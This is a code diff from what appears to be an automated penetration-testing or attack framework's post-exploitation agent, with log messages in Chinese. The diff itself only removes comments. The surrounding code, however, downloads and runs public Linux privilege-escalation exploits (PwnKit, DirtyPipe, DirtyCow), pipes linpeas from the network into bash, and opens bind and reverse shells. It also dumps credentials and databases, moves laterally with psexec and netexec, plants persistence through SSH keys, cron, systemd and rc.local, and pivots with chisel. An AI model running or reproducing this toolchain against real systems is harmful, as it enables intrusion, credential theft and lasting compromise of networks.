@@ -41,8 +41,6 @@ def _extract_rce_template(result: ExploitResult) -> Optional[str]:
         cmd = rec.get("command", "")
         if not cmd or not re.search(r"uid=\d+", out):
             continue
-        # curl-based web RCE: replace the OS command portion
-        # Pattern: system('CMD') or system("CMD") in URL or POST data
         for pat, repl_fn in [
             (r"system\(['\"]([^'\"]+)['\"]\)", lambda m: f'system(\'{{{{"CMD"}}}}\')' ),
             (r"\bcmd=([^\s&\"']+)", lambda m: "cmd={CMD}"),
@@ -119,9 +117,7 @@ def _extract_loot_hints(blob: str) -> list[dict[str, Any]]:
     return loot[:20]
 
 
-# ── Direct CVE exploit commands for RCE-template-based exploitation ──
 _CVE_EXPLOIT_CMDS: dict[str, list[str]] = {
-    # CVE-2021-4034 PwnKit — pkexec local privilege escalation
     "CVE-2021-4034": [
         "cd /tmp && curl -sLO https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit 2>/dev/null || "
         "wget -q https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit 2>/dev/null; "
@@ -132,7 +128,6 @@ _CVE_EXPLOIT_CMDS: dict[str, list[str]] = {
         "wget -q https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit 2>/dev/null; "
         "chmod +x PwnKit 2>/dev/null; ./PwnKit 'id' 2>/dev/null",
     ],
-    # CVE-2022-0847 DirtyPipe
     "CVE-2022-0847": [
         "cd /tmp && curl -sLO https://haxx.in/files/dirtypipez.c 2>/dev/null 2>&1; "
         "gcc dirtypipez.c -o dirtypipez 2>/dev/null; ./dirtypipez /usr/bin/su 2>/dev/null",
@@ -141,7 +136,6 @@ _CVE_EXPLOIT_CMDS: dict[str, list[str]] = {
         "cd /tmp && curl -sLO https://haxx.in/files/dirtypipez.c 2>/dev/null 2>&1; "
         "gcc dirtypipez.c -o dirtypipez 2>/dev/null; ./dirtypipez /usr/bin/su 2>/dev/null",
     ],
-    # CVE-2016-5195 DirtyCow
     "CVE-2016-5195": [
         "cd /tmp && curl -sLO https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c 2>/dev/null; "
         "gcc -pthread dirty.c -o dirty -lcrypt 2>/dev/null; ./dirty 2>/dev/null; su firefart -c 'id' 2>/dev/null",
@@ -150,7 +144,6 @@ _CVE_EXPLOIT_CMDS: dict[str, list[str]] = {
         "cd /tmp && curl -sLO https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c 2>/dev/null; "
         "gcc -pthread dirty.c -o dirty -lcrypt 2>/dev/null; ./dirty 2>/dev/null; su firefart -c 'id' 2>/dev/null",
     ],
-    # CVE-2021-3493 OverlayFS
     "CVE-2021-3493": [
         "cd /tmp && curl -sLO https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c 2>/dev/null; "
         "gcc exploit.c -o overlayfs 2>/dev/null; ./overlayfs 2>/dev/null && id",
@@ -191,14 +184,13 @@ class PostExploitAgent:
             await self._log(log_callback, "[PostAgent] LHOST 未设置，跳过反弹 shell")
             return None
 
-        # ── Start pwncat-cs listener (background) ──────────
         listener_task = None
         try:
             listener_task = asyncio.create_task(
                 self.executor.run(
                     tool="pwncat-cs",
                     args=["-l", "-p", lport, "--ssl"],
-                    timeout=0,  # Keep listening
+                    timeout=0,
                     task_id=task_id,
                 )
             )
@@ -233,7 +225,6 @@ class PostExploitAgent:
             except Exception as e:
                 logger.debug(f"[PostAgent] 反弹 shell ({method}) 失败: {e}")
 
-        # Cancel listener on failure
         if listener_task and not listener_task.done():
             listener_task.cancel()
         return None
@@ -253,7 +244,6 @@ class PostExploitAgent:
         bport = os.getenv("BPORT", "5555")
         await self._log(log_callback, f"[PostAgent] 尝试 bind shell (port {bport})...")
 
-        # Deploy bind shell listener on target
         bind_payloads: list[tuple[str, str]] = [
             ("nc_bind", f"ncat -lvp {bport} -e /bin/sh &"),
             ("python_bind", (
@@ -517,7 +507,6 @@ class PostExploitAgent:
                 "next_steps": next_steps,
             }
 
-        # No MSF session -- try RCE template if available
         rce_template = _extract_rce_template(first)
         if rce_template and first.exploit_level in ("rce", ""):
             logger.info("[PostAgent] 无 MSF 会话，通过 RCE 模板执行提权侦察")
@@ -612,7 +601,6 @@ class PostExploitAgent:
             found_suid = [b for b in interesting if b in suid_out]
             sudo_out = findings.get("sudo_preview", "")
             priv_success = len(found_suid) > 0 or "NOPASSWD" in sudo_out
-            # ── Attempt CVE exploitation based on linpeas highlights ──
             linpeas_hl = findings.get("linpeas_highlights", [])
             cve_results = await self._attempt_cve_exploitation(
                 session_id=None,
@@ -736,7 +724,6 @@ class PostExploitAgent:
                 except Exception:
                     pass
 
-            # ── impacket-secretsdump: dump SAM / LSA / NTDS ──
             first_success = successful[0]
             target_ip = (first_success.session_info or {}).get("target_ip", "")
             if target_ip:
@@ -762,7 +749,6 @@ class PostExploitAgent:
                         except Exception as e:
                             logger.debug(f"[PostAgent] secretsdump 失败: {e}")
 
-            # ── Database dumping ────────────────────────────
             for db_type, db_port, dump_cmd in [
                 ("mysql", 3306, "mysql -u root -e 'SHOW DATABASES;' 2>/dev/null | head -30"),
                 ("postgresql", 5432, "psql -U postgres -c '\\l' 2>/dev/null | head -30"),
@@ -781,7 +767,6 @@ class PostExploitAgent:
                         except Exception:
                             pass
 
-            # ── Parse linpeas output for sensitive file paths ──
             linpeas_summary = await _rce(
                 "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh "
                 "2>/dev/null | timeout 120 bash 2>/dev/null | head -500",
@@ -847,7 +832,6 @@ class PostExploitAgent:
         lateral_hosts: list[str] = []
         findings: dict[str, Any] = {}
 
-        # ── Phase 1: discover lateral targets ────────────────
         if rce_template and first.exploit_level in ("rce", ""):
             async def _rce(cmd: str) -> str:
                 try:
@@ -865,7 +849,6 @@ class PostExploitAgent:
             findings["discovered_hosts"] = lateral_hosts[:20]
             await self._log(log_callback, f"[PostAgent] 发现 {len(lateral_hosts[:20])} 个横向目标")
         elif session_id:
-            # Fallback via MSF session
             try:
                 arp_raw = await self.msf.run_session_command(session_id, "arp -a 2>/dev/null || ip neigh 2>/dev/null")
                 for m in re.finditer(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", arp_raw):
@@ -880,7 +863,6 @@ class PostExploitAgent:
             await self._log(log_callback, "[PostAgent] 横向移动跳过：未发现内网主机")
             return {"status": "ok", "lateral_hosts": [], "findings": findings}
 
-        # ── Phase 2: attempt lateral movement per credential ──
         lateral_successes: list[dict[str, Any]] = []
         for cred in credential_store[:8]:
             user = cred.get("user") or cred.get("pattern", "")
@@ -892,9 +874,8 @@ class PostExploitAgent:
 
             for host in lateral_hosts[:6]:
                 if any(s["host"] == host for s in lateral_successes):
-                    continue  # already succeeded on this host
+                    continue
 
-                # --- SMB (netexec) ---
                 try:
                     result = await self.executor.run(
                         tool="netexec",
@@ -911,7 +892,6 @@ class PostExploitAgent:
                 except Exception as e:
                     logger.debug(f"[PostAgent] netexec smb {host}: {e}")
 
-                # --- smbmap ---
                 try:
                     result = await self.executor.run(
                         tool="smbmap",
@@ -928,7 +908,6 @@ class PostExploitAgent:
                 except Exception as e:
                     logger.debug(f"[PostAgent] smbmap {host}: {e}")
 
-                # --- impacket-psexec (remote command execution) ---
                 try:
                     result = await self.executor.run(
                         tool="impacket-psexec",
@@ -945,7 +924,6 @@ class PostExploitAgent:
                 except Exception as e:
                     logger.debug(f"[PostAgent] impacket-psexec {host}: {e}")
 
-                # --- impacket-secretsdump (credential dumping) ---
                 if password or nt_hash:
                     try:
                         dump_args = [f"{user}:{password}@{host}"] if password else [f"{user}@{host}", "-hashes", f":{nt_hash}"]
@@ -964,7 +942,6 @@ class PostExploitAgent:
                     except Exception as e:
                         logger.debug(f"[PostAgent] impacket-secretsdump {host}: {e}")
 
-                # --- SSH (netexec ssh / impacket) ---
                 if target_os != "windows":
                     try:
                         result = await self.executor.run(
@@ -982,7 +959,6 @@ class PostExploitAgent:
                     except Exception as e:
                         logger.debug(f"[PostAgent] netexec ssh {host}: {e}")
 
-                # --- WMI (netexec wmi) ---
                 try:
                     result = await self.executor.run(
                         tool="netexec",
@@ -1033,7 +1009,6 @@ class PostExploitAgent:
                 except Exception:
                     return ""
 
-            # ── 1. pwncat-cs SSH key persistence ────────────
             lhost = os.getenv("LHOST", "")
             if lhost:
                 try:
@@ -1056,7 +1031,6 @@ class PostExploitAgent:
                 except Exception as e:
                     logger.debug(f"[PostAgent] pwncat-cs persistence failed: {e}")
 
-            # ── 2. SSH key deployment (authorized_keys) ─────
             ssh_key_out = await _rce(
                 "mkdir -p /root/.ssh /home/*/.ssh 2>/dev/null; "
                 "ssh-keygen -t rsa -f /tmp/.pentest_key -N '' -q 2>/dev/null; "
@@ -1073,7 +1047,6 @@ class PostExploitAgent:
                     "status": "ok",
                 })
 
-            # ── 3. Crontab persistence ──────────────────────
             cron_out = await _rce(
                 "(crontab -l 2>/dev/null; "
                 "echo '*/5 * * * * /tmp/.health_check.sh') | "
@@ -1087,7 +1060,6 @@ class PostExploitAgent:
                     "status": "ok",
                 })
 
-            # ── 4. Systemd timer persistence ────────────────
             systemd_out = await _rce(
                 "cat > /etc/systemd/system/pentest-sync.service << 'EOF' 2>/dev/null\n"
                 "[Unit]\nDescription=Pentest Sync Service\n\n"
@@ -1112,7 +1084,6 @@ class PostExploitAgent:
                     "status": "ok",
                 })
 
-            # ── 5. Startup script persistence ───────────────
             startup_out = await _rce(
                 "echo '/tmp/.health_check.sh &' >> /etc/rc.local 2>/dev/null; "
                 "chmod +x /etc/rc.local 2>/dev/null; "
@@ -1172,7 +1143,6 @@ class PostExploitAgent:
                 return ""
 
         if rce_template and first.exploit_level in ("rce", ""):
-            # ── Phase 1: network discovery ──────────────────
             iface_out = await _rce("ip addr show 2>/dev/null || ifconfig 2>/dev/null")
             route_out = await _rce("ip route 2>/dev/null || route -n 2>/dev/null")
             arp_out = await _rce("arp -a 2>/dev/null || ip neigh 2>/dev/null")
@@ -1184,12 +1154,10 @@ class PostExploitAgent:
                         subnets.append(subnet)
             await self._log(log_callback, f"[PostAgent] 发现 {len(subnets)} 个内网子网")
 
-            # ── Phase 2: setup pivoting (chisel) ────────────
             pivot_ready = False
             lhost = os.getenv("LHOST", "")
             if lhost and subnets:
                 try:
-                    # Deploy chisel client on target
                     chisel_deploy = await _rce(
                         f"curl -sL https://github.com/jpillora/chisel/releases/download/v1.9.1/"
                         f"chisel_1.9.1_linux_amd64.gz -o /tmp/chisel.gz 2>/dev/null && "
@@ -1205,7 +1173,6 @@ class PostExploitAgent:
                 except Exception as e:
                     logger.debug(f"[PostAgent] chisel deploy failed: {e}")
 
-            # ── Phase 3: ping sweep discover live hosts ─────
             for subnet in subnets[:3]:
                 await self._log(log_callback, f"[PostAgent] ping sweep: {subnet}")
                 scan_out = await _rce(
@@ -1219,7 +1186,6 @@ class PostExploitAgent:
                     if not any(h.get("ip") == ip for h in hosts):
                         hosts.append({"ip": ip, "source": "ping_sweep", "subnet": subnet})
 
-            # ARP neighbours
             for line in arp_out.splitlines():
                 for m in re.finditer(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", line):
                     ip = m.group(1)
@@ -1228,26 +1194,22 @@ class PostExploitAgent:
 
             await self._log(log_callback, f"[PostAgent] 发现 {len(hosts)} 台内网存活主机")
 
-            # ── Phase 4: nmap scan (via proxychains if pivot ready) ──
             for host_entry in hosts[:10]:
                 ip = host_entry["ip"]
                 try:
                     if pivot_ready and lhost:
-                        # Run nmap through proxychains via chisel SOCKS proxy
                         nmap_cmd = (
                             f"proxychains4 -q nmap -sT -sV -T4 -F --open "
                             f"-oG /tmp/nmap_{ip.replace('.', '_')}.gnmap {ip} 2>/dev/null"
                         )
                         nmap_out = await _rce(nmap_cmd, timeout=120)
                     else:
-                        # Fallback: basic port scan from compromised host
                         nmap_out = await _rce(
                             f"for port in 22 80 443 445 139 135 3306 5432 6379 8080 8443 3389 21 23 25 53 111 2049; "
                             f"do (echo >/dev/tcp/{ip}/$port) 2>/dev/null && echo OPEN:$port; done",
                             timeout=90,
                         )
                     if nmap_out.strip():
-                        # Parse open ports
                         open_ports: list[int] = []
                         for m in re.finditer(r"(?:OPEN:|(\d+)/open)", nmap_out):
                             port_str = m.group(1) or m.group(0).replace("OPEN:", "")
@@ -1265,7 +1227,6 @@ class PostExploitAgent:
                 except Exception as e:
                     logger.debug(f"[PostAgent] internal scan {ip}: {e}")
 
-            # ── Phase 5: netexec SMB scan on discovered hosts ──
             for host_entry in hosts[:10]:
                 ip = host_entry["ip"]
                 try:
@@ -1289,7 +1250,6 @@ class PostExploitAgent:
             )
 
         elif session_id:
-            # MSF session fallback: basic discovery
             try:
                 arp_raw = await self.msf.run_session_command(session_id, "arp -a 2>/dev/null")
                 for m in re.finditer(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", arp_raw):
@@ -1304,8 +1264,6 @@ class PostExploitAgent:
             "subnets": subnets,
             "hosts": hosts[:50],
             "scan_results": scan_results[:20],
-            # Structured for vuln_agent consumption:
-            # vuln_agent can iterate scan_results[].ip + scan_results[].open_ports
         }
 
     def _post_via_react_evidence(self, result: ExploitResult, target_os: str) -> dict[str, Any]:
@@ -1336,7 +1294,6 @@ class PostExploitAgent:
         interesting = ["bash", "vim", "nano", "python", "perl", "find", "nmap", "less", "more"]
         found_suid = [b for b in interesting if b in suid_out]
 
-        # ── linpeas: deeper privesc recon via MSF session ──
         linpeas_highlights: list[str] = []
         try:
             linpeas_out = await self.msf.run_session_command(
@@ -1354,7 +1311,6 @@ class PostExploitAgent:
         except Exception as e:
             logger.debug(f"[PostAgent] linpeas via MSF failed: {e}")
 
-        # ── pspy64: cron / scheduled task monitoring ──
         pspy_output = ""
         try:
             pspy_out = await self.msf.run_session_command(
@@ -1366,7 +1322,6 @@ class PostExploitAgent:
         except Exception as e:
             logger.debug(f"[PostAgent] pspy via MSF failed: {e}")
 
-        # ── Attempt CVE exploitation when linpeas finds known vectors ──
         cve_results = await self._attempt_cve_exploitation(
             session_id=session_id,
             linpeas_highlights=linpeas_highlights,
@@ -1460,7 +1415,6 @@ class PostExploitAgent:
                         "output": output[:500],
                     })
                 elif rce_template:
-                    # Attempt via direct exploit scripts through RCE template
                     for exploit_cmd in _CVE_EXPLOIT_CMDS.get(cve_name, []):
                         try:
                             out = await _run_cmd_via_rce(
